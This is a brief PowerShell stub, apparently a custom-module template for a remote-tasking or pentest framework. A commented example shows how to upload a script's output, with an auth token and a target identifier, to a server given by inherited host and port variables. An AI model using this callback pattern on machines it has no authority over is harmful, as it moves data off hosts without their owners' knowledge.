# custom.ps1 - inherits $H, $P, $AU, $LP, $TH from init.ps1
# to send output back to server:
#   $wc = New-Object Net.WebClient
#   $wc.Headers.Add("Authorization", $AU)
#   $wc.Headers.Add("Content-Type", "text/plain")
#   $wc.Headers.Add("X-Target", $TH)
#   $wc.UploadString("https://${H}:${P}/store/custom", $yourOutput)
